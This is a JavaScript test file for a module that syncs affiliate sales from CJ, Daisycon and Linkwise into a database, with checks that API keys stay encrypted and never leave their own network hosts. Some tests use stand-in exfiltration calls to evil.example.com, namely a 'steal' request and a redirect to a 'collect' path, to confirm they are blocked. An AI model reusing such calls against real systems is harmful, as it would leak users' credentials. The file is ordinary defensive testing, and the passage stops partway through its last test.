// Sales of CJ, Daisycon and Linkwise next to the Awin sales (lessons L197): what is read from each network, what is
// kept, the status in three words, our site code from the sub id, paging and date windows, one network failing without
// stopping the others, and that no key ever reaches a message, the database or another host.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { DatabaseSync } from 'node:sqlite';
import { syncNetworks, syncOne, createNetworkSync, NETWORKS, MAX_CALLS, FIRST_DAY } from '../../src/network-sync.js';
import { subIdParts, makeMask, windows, sealText, openText, sha256Hex, num, getMeta } from '../../src/networks/common.js';
import { cj, cjStatus, cjRow, commissionsQuery, RECORD_FIELDS } from '../../src/networks/cj.js';
import { daisycon, daisyconStatus, daisyconRows, PER_PAGE, RESUME_KEY } from '../../src/networks/daisycon.js';
import { linkwise, linkwiseRow, linkwiseStatus } from '../../src/networks/linkwise.js';
import { cjTest, linkwiseProbe } from '../../tools/network-sales.mjs';

const NOW = new Date('2026-11-19T12:00:00Z');
const KEY = Buffer.alloc(32, 7).toString('base64');
const CJ_TOKEN = 'cjToken-1234567890abcdef';
const DC = { DAISYCON_CLIENT_ID: 'dc-client-0001', DAISYCON_CLIENT_SECRET: 'dcSecret-abcdef123456', DAISYCON_REFRESH_SEED: 'seedRefresh-0000000001', NETWORK_SYNC_KEY: KEY };
const LW = { LINKWISE_API_USER: 'gearworld-api', LINKWISE_API_PASSWORD: 'lwPassword-998877' };

function fakeD1() {
  const sql = new DatabaseSync(':memory:');
  for (const f of ['0001_awin.sql', '0002_network_sales.sql', '0003_network_sync_meta.sql']) sql.exec(readFileSync(`sites/awin/migrations/${f}`, 'utf8'));
  const stmt = (text, args = []) => ({
    bind: (...a) => stmt(text, a),
    all: async () => ({ results: sql.prepare(text).all(...args).map(r => ({ ...r })) }),
    first: async () => { const r = sql.prepare(text).get(...args); return r ? { ...r } : null; },
    run: async () => { const r = sql.prepare(text).run(...args); return { meta: { changes: Number(r.changes) } }; }
  });
  return { sql, prepare: text => stmt(text), batch: async list => { for (const s of list) await s.run(); } };
}

const json = (body, status = 200, headers = {}) => new Response(typeof body === 'string' ? body : JSON.stringify(body), { status, headers: { 'Content-Type': 'application/json', ...headers } });

// A fake internet: answers by host and path, and writes down every call.
function fakeNet(routes) {
  const calls = [];
  const fetchFn = async (url, init = {}) => {
    const u = new URL(url);
    const body = init.body ? String(init.body) : '';
    calls.push({ url: u, init, body });
    for (const [k, v] of Object.entries(routes)) {
      if ((u.hostname + u.pathname).includes(k)) return typeof v === 'function' ? v(u, body, init) : v.clone();
    }
    return json({ error: 'no route' }, 404);
  };
  return { calls, fetchFn };
}

const cjRec = (id, over = {}) => ({
  commissionId: id, actionStatus: 'new', actionType: 'sim_sale', advertiserId: '5175167', advertiserName: 'XPLORA UK',
  eventDate: '2026-11-10T09:00:00Z', postingDate: '2026-11-10T10:00:00Z', lockingDate: '2026-12-11T10:00:00Z',
  validationStatus: null, original: true, originalActionId: `oa-${id}`, saleAmountPubCurrency: '99.99',
  pubCommissionAmountPubCurrency: '5.00', shopperId: 'tgw-123', orderId: 'ORDER-SECRET-9', country: 'GB', ...over
});

// A CJ that answers per CID and per date argument, with paging.
function fakeCj({ byCid = {}, pageSize = 1000, refuse = false } = {}) {
  return (u, body) => {
    if (refuse) return json({ message: 'Invalid auth token.' }, 401);
    const q = JSON.parse(body).query;
    const cid = /forPublishers: \["(\d+)"\]/.exec(q)[1];
    const recs = (byCid[cid] || []).filter(r => {
      const since = /sincePostingDate: "([^"]+)"/.exec(q); const before = /beforePostingDate: "([^"]+)"/.exec(q);
      if (since) return r.postingDate >= since[1] && r.postingDate < before[1];
      const ls = /sinceLockingDate: "([^"]+)"/.exec(q); const lb = /beforeLockingDate: "([^"]+)"/.exec(q);
      return r.lockingDate >= ls[1] && r.lockingDate < lb[1];
    }).sort((a, b) => Number(a.commissionId) - Number(b.commissionId));
    const after = /sinceCommissionId: "(\d+)"/.exec(q);
    const rest = after ? recs.filter(r => Number(r.commissionId) > Number(after[1])) : recs;
    const page = rest.slice(0, pageSize);
    return json({ data: { publisherCommissions: { count: page.length, payloadComplete: rest.length <= pageSize, maxCommissionId: page.length ? page[page.length - 1].commissionId : null, records: page } } });
  };
}

// A Daisycon whose refresh tokens work once, like the real one ("A refresh token can only be used once").
function fakeDaisycon({ transactions = [], valid = ['seedRefresh-0000000001'] } = {}) {
  const live = new Set(valid);
  let n = 0;
  return {
    live,
    transactions,
    routes: {
      'login.daisycon.com/oauth/access-token': (u, body) => {
        const p = new URLSearchParams(body);
        if (p.get('grant_type') !== 'refresh_token' || !live.has(p.get('refresh_token'))) return json({ error: 'invalid_grant', error_description: `token ${p.get('refresh_token')} used` }, 400);
        live.delete(p.get('refresh_token'));
        n++;
        const next = `dcRefresh-next-${n}-abcdef`;
        live.add(next);
        return json({ access_token: `dcAccess-${n}-abcdef123`, refresh_token: next, expires_in: 1800 });
      },
      'services.daisycon.com/publishers/': (u) => {
        const page = Number(u.searchParams.get('page'));
        const per = Number(u.searchParams.get('per_page'));
        const list = transactions.slice((page - 1) * per, page * per);
        return json(list, 200, { 'X-Total-Count': String(transactions.length) });
      },
      'services.daisycon.com/publishers': () => json([{ id: 123456, name: 'Gear World' }])
    }
  };
}

const dcTx = (id, parts) => ({ affiliatemarketing_id: id, program_id: 16029, program_name: 'Superdry EU', anonymous_ip: '1.2.3.x', device_type: 'pc',
  parts: parts.map((p, i) => ({ id: `P${i}`, media_id: 447289, date: '2026-11-15 10:07:22', approval_date: null, last_modified: '2026-11-15 10:07:22',
    status: 'open', subid: 'mgw-555', commission: 6, revenue: 80, referencenumber: 'REF-SECRET', referer_click: 'https://x', extra_1: 'e', ...p })) });

test('the site and product come from our sub id, the same form as the Awin clickref', () => {
  assert.deepEqual(subIdParts('cgw-82540'), { sub_id: 'cgw-82540', site: 'cgw', product_ref: '82540' });
  assert.deepEqual(subIdParts('TGW-promo-joybuy-halloween'), { sub_id: 'TGW-promo-joybuy-halloween', site: 'tgw', product_ref: 'promo-joybuy-halloween' });
  assert.equal(subIdParts('xyz-1').site, 'unknown');
  assert.equal(subIdParts('').site, 'unknown');
  assert.equal(subIdParts(null).site, 'unknown');
  assert.equal(subIdParts(' zgw-9 ').site, 'zgw');
  assert.equal(num('-1.852'), -1.852);
  assert.equal(num('n/a'), null);
  assert.equal(num(true), null);
});

test('CJ: the status in three words, GBP amounts, and none of the order, country or device fields', () => {
  assert.equal(cjStatus({ actionStatus: 'new' }), 'pending');
  assert.equal(cjStatus({ actionStatus: 'extended' }), 'pending');
  assert.equal(cjStatus({ actionStatus: 'locked' }), 'approved');
  assert.equal(cjStatus({ actionStatus: 'closed' }), 'approved');
  assert.equal(cjStatus({ actionStatus: 'locked', validationStatus: 'DECLINED' }), 'declined');
  assert.equal(cjStatus({ actionStatus: 'new', validationStatus: 'Declined' }), 'declined');
  assert.equal(cjStatus({ actionStatus: 'declined_by_advertiser' }), 'declined');
  const r = cjRow(cjRec('1'), NOW.toISOString(), 'GBP');
  assert.equal(r.site, 'tgw');
  assert.equal(r.product_ref, '123');
  assert.equal(r.sale_amount_gbp, 99.99);
  assert.equal(r.commission_amount_gbp, 5);
  assert.equal(r.raw_status, 'new');
  assert.ok(!JSON.stringify(r).includes('ORDER-SECRET'));
  const eur = cjRow(cjRec('2'), NOW.toISOString(), 'EUR');
  assert.equal(eur.commission_amount_gbp, null, 'pounds only when CJ gave pounds');
  const q = commissionsQuery('7806395', { sincePostingDate: '2026-11-01T00:00:00Z' });
  for (const banned of ['orderId', 'country', 'coupon', 'clickReferringURL', 'concludingDeviceName', 'websiteName']) assert.ok(!q.includes(banned), banned);
  assert.ok(RECORD_FIELDS.includes('shopperId'), 'our SID comes back in shopperId');
  assert.ok(commissionsQuery('1', { sincePostingDate: 'a" } evil' }).includes('"a\\" } evil"'), 'arguments are quoted');
});

test('CJ: first run from the first day in ranges under 31 days, page after page, every CID on its own; the key only in the header', async () => {
  const db = fakeD1();
  const many = Array.from({ length: 5 }, (_, i) => cjRec(String(100 + i), { shopperId: `cgw-${i}` }));
  const net = fakeNet({ 'commissions.api.cj.com/query': fakeCj({ byCid: { 7806395: many }, pageSize: 2 }) });
  const run = await syncOne(cj, { CJ_TOKEN, CJ_PUBLISHER_IDS: '8114224,7806395' }, { fetchFn: net.fetchFn, now: NOW, db });
  assert.equal(run.ok, true, run.message);
  assert.equal(run.saved, 5);
  const posting = net.calls.map(c => JSON.parse(c.body).query).filter(q => q.includes('sincePostingDate'));
  assert.ok(posting.some(q => q.includes(`sincePostingDate: "${FIRST_DAY}T00:00:00Z"`)), 'the first run starts at FIRST_DAY');
  for (const q of posting) {
    const s = Date.parse(/sincePostingDate: "([^"]+)"/.exec(q)[1]); const e = Date.parse(/beforePostingDate: "([^"]+)"/.exec(q)[1]);
    assert.ok((e - s) / 864e5 <= 31, 'at most 31 days per range');
  }
  assert.ok(posting.some(q => q.includes('sinceCommissionId: "101"')), 'the next page starts after maxCommissionId');
  assert.ok(posting.some(q => q.includes('forPublishers: ["8114224"]')) && posting.some(q => q.includes('forPublishers: ["7806395"]')), 'each CID asked');
  for (const c of net.calls) {
    assert.equal(c.init.headers.authorization, `Bearer ${CJ_TOKEN}`);
    assert.ok(!c.url.toString().includes(CJ_TOKEN) && !c.body.includes(CJ_TOKEN));
  }
  const rows = db.sql.prepare("SELECT site, status, currency FROM network_transactions WHERE network = 'cj' ORDER BY id").all();
  assert.deepEqual(rows.map(r => r.site), ['cgw', 'cgw', 'cgw', 'cgw', 'cgw']);
  assert.ok(rows.every(r => r.currency === 'GBP'));
});

test('CJ: a later run reads 90 days again, updates a status without a second row, and a fully corrected sale is declined', async () => {
  const db = fakeD1();
  const first = fakeNet({ 'commissions.api.cj.com/query': fakeCj({ byCid: { 7806395: [cjRec('1'), cjRec('2', { originalActionId: 'oa-x' })] } }) });
  await syncOne(cj, { CJ_TOKEN, CJ_PUBLISHER_IDS: '7806395' }, { fetchFn: first.fetchFn, now: NOW, db });
  const later = new Date('2026-12-12T12:00:00Z');
  const second = fakeNet({ 'commissions.api.cj.com/query': fakeCj({ byCid: { 7806395: [
    cjRec('1', { actionStatus: 'locked' }),
    cjRec('2', { originalActionId: 'oa-x' }),
    cjRec('3', { original: false, originalActionId: 'oa-x', postingDate: '2026-12-01T10:00:00Z', saleAmountPubCurrency: '-99.99', pubCommissionAmountPubCurrency: '-5.00', actionStatus: 'new' })
  ] } }) });
  const run = await syncOne(cj, { CJ_TOKEN, CJ_PUBLISHER_IDS: '7806395' }, { fetchFn: second.fetchFn, now: later, db });
  assert.equal(run.ok, true, run.message);
  const rows = db.sql.prepare("SELECT id, status, is_correction, first_seen_at, updated_at FROM network_transactions WHERE network = 'cj' ORDER BY id").all();
  assert.equal(rows.length, 3);
  assert.equal(rows[0].status, 'approved');
  assert.equal(rows[0].first_seen_at, NOW.toISOString(), 'the first-seen date stays');
  assert.equal(rows[0].updated_at, later.toISOString());
  assert.deepEqual(rows.slice(1).map(r => [r.status, r.is_correction]), [['declined', 0], ['declined', 1]], 'sale and correction add up to 0');
  const starts = second.calls.map(c => JSON.parse(c.body).query).map(q => /sincePostingDate: "([^"]+)"/.exec(q)).filter(Boolean).map(m => m[1]);
  assert.equal(starts[0], '2026-09-13T12:00:00Z', '90 days back, not from the first day');
});

test('CJ: one CID that errors is noted, a refused key stops CJ, and the key never shows', async () => {
  const db = fakeD1();
  const mixed = fakeNet({ 'commissions.api.cj.com/query': (u, body) => (body.includes('8114224') ? json({ errors: [{ message: 'Not authorized for 8114224' }] }) : fakeCj({ byCid: { 7806395: [cjRec('1')] } })(u, body)) });
  const ok = await syncOne(cj, { CJ_TOKEN, CJ_PUBLISHER_IDS: '8114224,7806395' }, { fetchFn: mixed.fetchFn, now: NOW, db });
  assert.equal(ok.ok, true);
  assert.match(ok.message, /CID 8114224: CJ: Not authorized/);
  const refused = fakeNet({ 'commissions.api.cj.com/query': () => json({ message: `Invalid auth token. ${CJ_TOKEN}` }, 401) });
  const bad = await syncOne(cj, { CJ_TOKEN, CJ_PUBLISHER_IDS: '7806395' }, { fetchFn: refused.fetchFn, now: NOW, db });
  assert.equal(bad.ok, false);
  assert.match(bad.message, /CJ key was refused/);
  const none = await syncOne(cj, { CJ_TOKEN, CJ_PUBLISHER_IDS: '' }, { fetchFn: refused.fetchFn, now: NOW, db });
  assert.match(none.message, /no CJ account number/);
  const runs = db.sql.prepare("SELECT ok, message FROM network_sync_runs WHERE network = 'cj' ORDER BY id").all();
  assert.deepEqual(runs.map(r => r.ok), [1, 0, 0]);
  assert.ok(runs.every(r => !String(r.message).includes(CJ_TOKEN)));
});

test('Daisycon: statuses, one row per part, and no IP, order reference, referrer or extra fields', () => {
  assert.equal(daisyconStatus('open'), 'pending');
  assert.equal(daisyconStatus('approved'), 'approved');
  assert.equal(daisyconStatus('disapproved'), 'declined');
  assert.equal(daisyconStatus('potential'), 'pending');
  const rows = daisyconRows(dcTx('AB12', [{}, { status: 'approved', approval_date: '2026-11-18 09:00:00', subid: 'hgw-77', currency_code: 'GBP' }]), NOW.toISOString());
  assert.deepEqual(rows.map(r => [r.id, r.site, r.status, r.currency, r.commission_amount_gbp]), [['AB12-P0', 'mgw', 'pending', 'EUR', null], ['AB12-P1', 'hgw', 'approved', 'GBP', 6]]);
  assert.equal(rows[1].locking_date, '2026-11-18T09:00:00');
  assert.equal(rows[0].advertiser_name, 'Superdry EU');
  const all = JSON.stringify(rows);
  for (const banned of ['1.2.3.x', 'REF-SECRET', 'https://x', '"e"']) assert.ok(!all.includes(banned), banned);
});

test('Daisycon: the first run uses the setup sign-in, keeps the NEW key encrypted, and the next run uses that one', async () => {
  const db = fakeD1();
  const txs = Array.from({ length: PER_PAGE + 3 }, (_, i) => dcTx(`T${i}`, [{}]));
  const dc = fakeDaisycon({ transactions: txs });
  const net = fakeNet(dc.routes);
  const run1 = await syncOne(daisycon, DC, { fetchFn: net.fetchFn, now: NOW, db });
  assert.equal(run1.ok, true, run1.message);
  assert.equal(run1.saved, PER_PAGE + 3, 'two pages read');
  const kept = db.sql.prepare("SELECT iv, ciphertext, seed_hash FROM network_oauth WHERE network = 'daisycon'").get();
  assert.ok(kept && kept.ciphertext);
  assert.ok(!kept.ciphertext.includes('dcRefresh') && !JSON.stringify(kept).includes('dcRefresh-next-1'), 'never kept in plain text');
  assert.equal(await openText(KEY, kept, 'daisycon'), 'dcRefresh-next-1-abcdef');
  assert.equal(kept.seed_hash, await sha256Hex(DC.DAISYCON_REFRESH_SEED));
  const tx = net.calls.filter(c => c.url.pathname.endsWith('/transactions'));
  assert.equal(tx[0].url.searchParams.get('date_modified_start'), FIRST_DAY);
  assert.ok(tx.every(c => c.url.pathname === '/publishers/123456/transactions'));
  for (const c of net.calls.filter(c => c.url.hostname === 'services.daisycon.com')) assert.match(c.init.headers.authorization, /^Bearer dcAccess-/);
  // run 2: the seed is used up; the kept key works
  const run2 = await syncOne(daisycon, DC, { fetchFn: net.fetchFn, now: new Date(NOW.getTime() + 2 * 3600e3), db });
  assert.equal(run2.ok, true, run2.message);
  assert.equal(await openText(KEY, db.sql.prepare("SELECT iv, ciphertext FROM network_oauth WHERE network = 'daisycon'").get(), 'daisycon'), 'dcRefresh-next-2-abcdef');
  assert.equal(db.sql.prepare("SELECT COUNT(*) AS n FROM network_transactions WHERE network = 'daisycon'").get().n, PER_PAGE + 3, 'no second rows');
  // a new sign-in from the setup tool (new seed) replaces the kept key
  dc.live.add('seedRefresh-0000000002');
  const run3 = await syncOne(daisycon, { ...DC, DAISYCON_REFRESH_SEED: 'seedRefresh-0000000002' }, { fetchFn: net.fetchFn, now: NOW, db });
  assert.equal(run3.ok, true, run3.message);
  assert.equal(db.sql.prepare("SELECT seed_hash FROM network_oauth WHERE network = 'daisycon'").get().seed_hash, await sha256Hex('seedRefresh-0000000002'));
  const secrets = [DC.DAISYCON_CLIENT_SECRET, DC.DAISYCON_REFRESH_SEED, 'dcRefresh-next-1-abcdef', 'dcAccess-1-abcdef123'];
  const dump = JSON.stringify(db.sql.prepare('SELECT * FROM network_transactions').all()) + JSON.stringify(db.sql.prepare('SELECT * FROM network_sync_runs').all());
  for (const s of secrets) assert.ok(!dump.includes(s), 'no key in the database');
});

test('Daisycon: a used or expired sign-in fails with what to do, and the keys never show', async () => {
  const db = fakeD1();
  const dc = fakeDaisycon({ valid: [] });
  const run = await syncOne(daisycon, DC, { fetchFn: fakeNet(dc.routes).fetchFn, now: NOW, db });
  assert.equal(run.ok, false);
  assert.match(run.message, /Daisycon refused the sign-in from the setup tool/);
  assert.match(run.message, /network-sales-setup\.ps1 -Only daisycon/);
  assert.ok(!run.message.includes(DC.DAISYCON_REFRESH_SEED), 'the seed is hidden even when Daisycon repeats it');
  const fresh = fakeDaisycon();
  const wrongKey = await syncOne(daisycon, { ...DC, NETWORK_SYNC_KEY: 'short' }, { fetchFn: fakeNet(fresh.routes).fetchFn, now: NOW, db });
  assert.equal(wrongKey.ok, false);
  assert.match(wrongKey.message, /NETWORK_SYNC_KEY is not a 32-byte key/);
  assert.ok(fresh.live.has(DC.DAISYCON_REFRESH_SEED), 'a bad key is found BEFORE the one-use sign-in is spent');
  // the new sign-in cannot be kept: the sales are saved, the run is marked failed with what to do
  const db2 = fakeD1();
  const realPrepare = db2.prepare;
  db2.prepare = text => (/INSERT INTO network_oauth/.test(text) ? { bind: () => ({ run: async () => { throw new Error('D1 busy'); } }) } : realPrepare(text));
  const waits = [];
  const lost = await syncOne(daisycon, DC, { fetchFn: fakeNet(fakeDaisycon({ transactions: [dcTx('T1', [{}])] }).routes).fetchFn, now: NOW, db: db2, sleepFn: async ms => { waits.push(ms); } });
  assert.equal(lost.ok, false);
  assert.equal(lost.saved, 1);
  assert.match(lost.message, /could not be kept: sign in again with tools\/network-sales-setup\.ps1 -Only daisycon/);
  assert.deepEqual(waits, [2000, 4000], '3 attempts, a few seconds apart');
});

test('Linkwise: held, in its own state (never a failure), until its report parameters are known; the mapping is ready', async () => {
  const db = fakeD1();
  const net = fakeNet({});
  const run = await syncOne(linkwise, LW, { fetchFn: net.fetchFn, now: NOW, db });
  assert.equal(run.state, 'held');
  assert.match(run.message, /waiting for the parameters/);
  assert.equal(net.calls.length, 0, 'no call while it is held');
  const row = db.sql.prepare("SELECT ok, state FROM network_sync_runs WHERE network = 'linkwise'").get();
  assert.deepEqual([row.ok, row.state], [2, 'held'], 'ok = 2 and state held: a reader of ok = 0 never sees it as a problem');
  const all = await syncNetworks({ SALES_DB: db, ...LW }, { fetchFn: net.fetchFn, now: NOW });
  assert.equal(all.ok, true, 'a held network does not make the whole sync fail');
  assert.equal(linkwise.ready, false);
  assert.equal(linkwiseStatus('Approved'), 'approved');
  assert.equal(linkwiseStatus('rejected'), 'declined');
  assert.equal(linkwiseStatus('pending'), 'pending');
  const r = linkwiseRow({ transaction_id: 77, subid1: 'cgw-5', program_id: 12, program_name: 'Shop GR', status: 'approved', amount: '50.00', commission: '4,00', date: '2026-11-20 10:00:00' }, NOW.toISOString());
  assert.deepEqual([r.network, r.id, r.site, r.status, r.commission_amount, r.currency], ['linkwise', '77', 'cgw', 'approved', 4, 'EUR']);
  assert.equal(linkwiseRow({ nothing: 1 }, NOW.toISOString()), null);
});

test('one network failing does not stop the others; a network with no secrets is skipped without a row; no key in any message', async () => {
  const db = fakeD1();
  const dc = fakeDaisycon({ transactions: [dcTx('T1', [{}])] });
  const net = fakeNet({ 'commissions.api.cj.com/query': () => json({ message: `Invalid auth token ${CJ_TOKEN}` }, 401), ...dc.routes });
  const env = { SALES_DB: db, CJ_TOKEN, CJ_PUBLISHER_IDS: '7806395', ...DC };
  const out = await syncNetworks(env, { fetchFn: net.fetchFn, now: NOW });
  assert.equal(out.ok, false);
  assert.deepEqual(out.results.map(r => [r.network, r.skipped ? 'skipped' : r.ok]), [['cj', false], ['daisycon', true], ['linkwise', 'skipped']]);
  const runs = db.sql.prepare('SELECT network, ok, message FROM network_sync_runs ORDER BY id').all();
  assert.deepEqual(runs.map(r => [r.network, r.ok]), [['cj', 0], ['daisycon', 1]]);
  const all = JSON.stringify(runs) + JSON.stringify(out);
  for (const s of [CJ_TOKEN, ...Object.values(DC), 'dcAccess-1-abcdef123', 'dcRefresh-next-1-abcdef']) assert.ok(!all.includes(s), 'no key shows');
  // half the secrets: a run row that names only what is missing
  const half = await syncOne(daisycon, { DAISYCON_CLIENT_ID: 'x-client', NETWORK_SYNC_KEY: KEY }, { fetchFn: net.fetchFn, now: NOW, db });
  assert.equal(half.message, 'missing secret(s): DAISYCON_REFRESH_SEED');
  assert.equal((await syncNetworks({}, { fetchFn: net.fetchFn })).message, 'no database binding SALES_DB');
});

test('a key goes only to its own network, and a run makes at most MAX_CALLS calls', async () => {
  const db = fakeD1();
  const sneaky = { ...cj, id: 'sneaky', async run(ctx) { await ctx.call('https://evil.example.com/steal'); return []; } };
  const net = fakeNet({});
  const r = await syncOne(sneaky, { CJ_TOKEN, CJ_PUBLISHER_IDS: '1' }, { fetchFn: net.fetchFn, now: NOW, db });
  assert.match(r.message, /refused: evil\.example\.com is not a CJ address/);
  assert.equal(net.calls.length, 0);
  const greedy = { ...cj, id: 'greedy', async run(ctx) { for (;;) await ctx.call('https://commissions.api.cj.com/query'); } };
  const g = await syncOne(greedy, { CJ_TOKEN }, { fetchFn: async () => json({}), now: NOW, db });
  assert.equal(g.calls, MAX_CALLS);
  assert.match(g.message, /more than 40 CJ calls/);
  assert.equal(makeMask(['abcdef123'])('x abcdef123 y Bearer zz.9 Basic qq='), 'x [secret] y Bearer [secret] Basic [secret]');
  for (const n of NETWORKS) for (const h of n.hosts) assert.match(h, /(^|\.)(cj\.com|daisycon\.com|linkwi\.se)$/, `${n.id} host ${h}`);
});

test('the kept key is encrypted and bound to its network; the date windows are back to back', async () => {
  const s = await sealText(KEY, 'refresh-123456', 'daisycon');
  assert.equal(await openText(KEY, s, 'daisycon'), 'refresh-123456');
  await assert.rejects(() => openText(KEY, s, 'linkwise'), 'not readable under another label');
  await assert.rejects(() => openText(Buffer.alloc(32, 8).toString('base64'), s, 'daisycon'), 'not readable with another key');
  const w = windows(FIRST_DAY, NOW, 30);
  for (let i = 0; i < w.length; i++) {
    assert.ok((w[i].end - w[i].start) / 864e5 <= 30);
    if (i) assert.equal(w[i].start.getTime(), w[i - 1].end.getTime(), 'no gap, no overlap');
  }
  assert.equal(w[w.length - 1].end.getTime(), NOW.getTime());
});

test('the Worker has no public answer and runs the sync on its cron', async () => {
  const w = createNetworkSync({ fetchFn: fakeNet({}).fetchFn });
  assert.equal((await w.fetch(new Request('https://x/anything'))).status, 404);
  const db = fakeD1();
  const waits = [];
  await w.scheduled({}, { SALES_DB: db, ...LW }, { waitUntil: p => waits.push(p) });
  await Promise.all(waits);
  assert.equal(db.sql.prepare("SELECT COUNT(*) AS n FROM network_sync_runs WHERE network = 'linkwise'").get().n, 1);
});

test('the config template: no public address, its own cron, the Awin database, no real ID and no key', () => {
  const t = readFileSync('sites/network-sales/wrangler.jsonc.example', 'utf8');
  assert.match(t, /"name": "gear-world-network-sync"/);
  assert.match(t, /"workers_dev": false/);
  assert.match(t, /"preview_urls": false/);
  assert.match(t, /"crons": \["47 \*\/2 \* \* \*"\]/);
  assert.match(t, /"database_name": "gear-world-awin"/);
  assert.match(t, /"migrations_dir": "\.\.\/awin\/migrations"/);
  assert.match(t, /REPLACE_WITH_DATABASE_ID/);
  assert.doesNotMatch(t, /"routes"/);
  for (const n of NETWORKS) for (const s of [...n.secrets, ...n.optionalSecrets]) assert.doesNotMatch(t, new RegExp(`"${s}"\\s*:`), `${s} is a secret, never a var`);
});

test('the migration only adds: the Awin tables are the same, and one view lists every network', () => {
  const only1 = new DatabaseSync(':memory:');
  only1.exec(readFileSync('sites/awin/migrations/0001_awin.sql', 'utf8'));
  const db = fakeD1();
  for (const t of ['awin_transactions', 'awin_advertisers', 'awin_sync_runs']) {
    assert.deepEqual(db.sql.prepare(`PRAGMA table_info(${t})`).all(), only1.prepare(`PRAGMA table_info(${t})`).all(), `${t} unchanged`);
  }
  const m = readFileSync('sites/awin/migrations/0002_network_sales.sql', 'utf8').replace(/--[^\n]*/g, '');
  assert.doesNotMatch(m, /\b(DROP|ALTER|DELETE|UPDATE|INSERT)\b/i, 'nothing but CREATE');
  const m3 = readFileSync('sites/awin/migrations/0003_network_sync_meta.sql', 'utf8').replace(/--[^\n]*/g, '');
  assert.doesNotMatch(m3.replace(/ALTER TABLE network_sync_runs ADD COLUMN state TEXT;/, ''), /\b(DROP|ALTER|DELETE|UPDATE|INSERT)\b/i, '0003: one new column of our own table and one new table');
  assert.doesNotMatch(m3, /awin_/, '0003 does not touch the Awin tables');
  // The view names awin_transactions columns: SQLite refuses to drop one of them while the view exists (L197 note).
  assert.throws(() => db.sql.exec('ALTER TABLE awin_transactions DROP COLUMN click_ref'));
  db.sql.exec("INSERT INTO awin_transactions (id, publisher_id, site, status, commission_amount, commission_currency, first_seen_at, updated_at) VALUES ('a1', '1', 'cgw', 'deleted', 1.5, 'GBP', 'x', 'x')");
  db.sql.exec("INSERT INTO network_transactions (network, id, site, status, commission_amount, currency, commission_amount_gbp, first_seen_at, updated_at) VALUES ('cj', 'c1', 'tgw', 'approved', 2, 'GBP', 2, 'x', 'x')");
  const v = db.sql.prepare('SELECT network, id, status, commission_amount_gbp FROM all_network_sales ORDER BY network').all();
  assert.deepEqual(v.map(r => [r.network, r.id, r.status, r.commission_amount_gbp]), [['awin', 'a1', 'declined', 1.5], ['cj', 'c1', 'approved', 2]]);
});

test('setup helper: the CJ key test and the Linkwise probe report names only, never values or keys', async () => {
  const net = fakeNet({ 'commissions.api.cj.com/query': fakeCj({ byCid: { 7806395: [cjRec('1', { postingDate: '2026-11-18T10:00:00Z' })] } }) });
  const t = await cjTest({ token: CJ_TOKEN, cids: ['8114224', '7806395'], fetchImpl: net.fetchFn, now: NOW });
  assert.equal(t.ok, true);
  assert.deepEqual(t.cids.map(c => [c.cid, c.count]), [['8114224', 0], ['7806395', 1]]);
  const refused = await cjTest({ token: CJ_TOKEN, cids: ['7806395'], fetchImpl: fakeNet({ 'commissions.api.cj.com': () => json({ message: 'Invalid auth token.' }, 401) }).fetchFn, now: NOW });
  assert.equal(refused.ok, false);
  assert.equal(refused.refused, true);
  const lw = fakeNet({
    'affiliate.linkwi.se/api/1.1/reports_transaction.json': (u, b, init) => (init.headers.authorization === `Basic ${btoa('gearworld-api:lwPassword-998877')}` ? json({ error: 'Missing parameter: date_from', transactions: [{ transaction_id: 'SECRET-TX-1', subid1: 'cgw-1', amount: '12.00' }] }) : json({}, 401)),
    'affiliate.linkwi.se/api/1.1/programs.json': () => new Response('<programs><program><name>Shop</name></program></programs>', { status: 200, headers: { 'Content-Type': 'text/xml' } })
  });
  const p = await linkwiseProbe({ user: LW.LINKWISE_API_USER, pass: LW.LINKWISE_API_PASSWORD, fetchImpl: lw.fetchFn });
  assert.equal(p.ok, true);
  assert.deepEqual(p.calls[0].itemKeys, ['transaction_id', 'subid1', 'amount']);
  assert.equal(p.calls[0].tell.error, '"Missing parameter: date_from"');
  assert.deepEqual(p.calls[1].tags, ['programs', 'program', 'name']);
  const all = JSON.stringify(p);
  for (const banned of ['SECRET-TX-1', '12.00', 'Shop<', LW.LINKWISE_API_PASSWORD]) assert.ok(!all.includes(banned), banned);
  assert.equal((await linkwiseProbe({ user: 'u', pass: 'p', fetchImpl: lw.fetchFn, api: 'https://evil.example.com/api' })).error, 'unexpected API address');
});

test('review P1-5: a redirect is never followed, so a key never goes on to another host', async () => {
  const db = fakeD1();
  const net = fakeNet({ 'commissions.api.cj.com/query': () => new Response('', { status: 302, headers: { Location: 'https://evil.example.com/collect' } }) });
  const run = await syncOne(cj, { CJ_TOKEN, CJ_PUBLISHER_IDS: '7806395' }, { fetchFn: net.fetchFn, now: NOW, db });
  assert.equal(run.ok, false);
  assert.match(run.message, /redirect \(302\); it is not followed/);
  assert.equal(net.calls.length, 1, 'no second call');
  assert.equal(net.calls[0].init.redirect, 'manual');
  const t = await cjTest({ token: CJ_TOKEN, cids: ['7806395'], fetchImpl: net.fetchFn, now: NOW });
  assert.equal(t.ok, false);
  assert.match(t.cids[0].error, /redirect 302, not followed/);
});

test('review P1-8: the first run is the first that ends well, not "no sales yet"', async () => {
  const db = fakeD1();
  const empty = fakeNet({ 'commissions.api.cj.com/query': fakeCj({ byCid: {} }) });
  const r1 = await syncOne(cj, { CJ_TOKEN, CJ_PUBLISHER_IDS: '7806395' }, { fetchFn: empty.fetchFn, now: NOW, db });
  assert.equal(r1.ok, true);
  assert.equal(r1.saved, 0);
  const again = fakeNet({ 'commissions.api.cj.com/query': fakeCj({ byCid: {} }) });
  await syncOne(cj, { CJ_TOKEN, CJ_PUBLISHER_IDS: '7806395' }, { fetchFn: again.fetchFn, now: NOW, db });
  const starts = again.calls.map(c => /sincePostingDate: "([^"]+)"/.exec(JSON.parse(c.body).query)).filter(Boolean).map(m => m[1]);
  assert.equal(starts[0], '2026-08-21T12:00:00Z', 'the second run reads 90 days back, not from FIRST_DAY again');
  // a failed run is not a good run: the next one is still a first run
  const db2 = fakeD1();
  await syncOne(cj, { CJ_TOKEN, CJ_PUBLISHER_IDS: '7806395' }, { fetchFn: fakeNet({ 'commissions.api.cj.com/query': () => json({}, 500) }).fetchFn, now: NOW, db: db2 });
  const third = fakeNet({ 'commissions.api.cj.com/query': fakeCj({ byCid: {} }) });
  await syncOne(cj, { CJ_TOKEN, CJ_PUBLISHER_IDS: '7806395' }, { fetchFn: third.fetchFn, now: NOW, db: db2 });
  assert.ok(third.calls.some(c => JSON.parse(c.body).query.includes(`sincePostingDate: "${FIRST_DAY}T00:00:00Z"`)));
